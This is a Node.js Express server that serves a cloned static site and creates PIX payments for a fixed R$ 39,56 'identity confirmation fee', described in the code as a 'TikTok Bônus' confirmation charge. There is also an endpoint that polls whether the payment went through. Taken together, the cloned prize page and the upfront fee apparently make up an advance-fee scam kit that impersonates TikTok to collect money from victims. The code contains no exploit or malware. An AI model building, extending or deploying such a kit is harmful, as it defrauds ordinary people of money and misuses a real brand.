const express = require('express');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const GHOSTSPAY_SECRET_KEY = process.env.GHOSTSPAY_SECRET_KEY || '';
const GHOSTSPAY_COMPANY_ID = process.env.GHOSTSPAY_COMPANY_ID || '';
const GHOSTSPAY_POSTBACK_URL = process.env.GHOSTSPAY_POSTBACK_URL || '';
const GHOSTSPAY_BASE_URL = 'https://api.ghostspaysv2.com/functions/v1';

if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
  console.warn(
    '[GhostsPays] Atenção: defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID no .env para habilitar a criação real de pagamentos.'
  );
}

app.use(express.json());

// Servir o clone estático (mantendo estrutura atual)
const staticRoot = path.join(__dirname, 'clones', 'premiaon.vercel.app');
app.use(express.static(staticRoot));

function buildAuthHeader() {
  const credentials = Buffer.from(`${GHOSTSPAY_SECRET_KEY}:${GHOSTSPAY_COMPANY_ID}`).toString('base64');
  return `Basic ${credentials}`;
}

async function callGhostsPays(endpoint, options) {
  const url = `${GHOSTSPAY_BASE_URL}${endpoint}`;
  const resp = await fetch(url, options);
  const text = await resp.text();
  let json;
  try {
    json = text ? JSON.parse(text) : null;
  } catch (e) {
    json = { raw: text };
  }
  return { status: resp.status, body: json };
}

function normalizePixResponse(body) {
  if (!body || typeof body !== 'object') return body;
  const data = body.data || body;
  const id = body.id ?? data.id ?? body.transactionId ?? data.transactionId;
  const amount = body.amount ?? data.amount;
  const status = body.status ?? data.status ?? 'waiting_payment';
  const pixBlock = body.pix ?? data.pix ?? body.pixPayment ?? data.pixPayment ?? {};
  const qrcode =
    pixBlock.qrcode ?? pixBlock.qrCode ?? pixBlock.qrcodeImage ?? body.qrcode ?? data.qrcode ?? (typeof pixBlock.image === 'string' ? pixBlock.image : null);
  const qrcodeText =
    pixBlock.qrcodeText ?? pixBlock.copyPaste ?? pixBlock.brCode ?? pixBlock.pixKey ?? body.qrcodeText ?? body.brCode ?? data.qrcodeText ?? data.brCode ?? (typeof pixBlock.text === 'string' ? pixBlock.text : null);
  return {
    id,
    amount,
    status,
    pix: { qrcode: qrcode || null, qrcodeText: qrcodeText || null }
  };
}

// Cria um pagamento PIX fixo para a taxa de confirmação (R$ 39,56) — payload conforme doc GhostsPays
app.post('/api/ghostspay/pix-taxa', async (req, res) => {
  if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const amount = 3956; // R$ 39,56 em centavos
  const bodyReq = typeof req.body === 'object' ? req.body || {} : {};
  const chaveRaw = (bodyReq.chave || '').toString().trim();
  const tipo = (bodyReq.tipo || 'cpf').toLowerCase();
  const apenasDigitos = (chaveRaw || '').replace(/\D/g, '');
  const cpfNumero = apenasDigitos.length >= 11 ? apenasDigitos.slice(0, 11) : (apenasDigitos.length > 0 ? apenasDigitos : null);
  if (!cpfNumero || cpfNumero.length < 11) {
    return res.status(400).json({
      error: { code: 'CHAVE_OBRIGATORIA', message: 'Informe a chave PIX (CPF com 11 dígitos, e-mail ou telefone).' }
    });
  }
  const nomeExibicao = chaveRaw || cpfNumero;
  const emailCliente = tipo === 'email' && chaveRaw.indexOf('@') >= 0 ? chaveRaw : `cpf${cpfNumero}@example.com`;
  const phoneCliente = tipo === 'numero' && apenasDigitos.length >= 10 ? apenasDigitos.slice(0, 11) : '11999999999';

  const payload = {
    customer: {
      name: nomeExibicao,
      email: emailCliente,
      phone: phoneCliente,
      document: { number: cpfNumero, type: 'CPF' }
    },
    paymentMethod: 'PIX',
    amount,
    items: [
      {
        title: 'Taxa de confirmação de identidade',
        unitPrice: amount,
        quantity: 1
      }
    ],
    pix: { expiresInDays: 1 },
    description: 'Taxa de confirmação TikTok Bônus'
  };

  if (GHOSTSPAY_POSTBACK_URL) {
    payload.postbackUrl = GHOSTSPAY_POSTBACK_URL;
  }

  try {
    const { status, body } = await callGhostsPays('/transactions', {
      method: 'POST',
      headers: {
        Authorization: buildAuthHeader(),
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (status >= 200 && status < 300) {
      return res.status(status).json(normalizePixResponse(body));
    }
    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
});

// Consulta de status de uma transação (usado opcionalmente pelo fluxo "Já paguei")
app.get('/api/ghostspay/transactions/:id', async (req, res) => {
  if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const id = req.params.id;
  try {
    const { status, body } = await callGhostsPays(`/transactions/${id}`, {
      method: 'GET',
      headers: {
        Authorization: buildAuthHeader()
      }
    });
    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao consultar transação:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
});

// Fallback para servir a página principal caso acessem rotas desconhecidas via navegador
app.get('*', (req, res) => {
  res.sendFile(path.join(staticRoot, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});

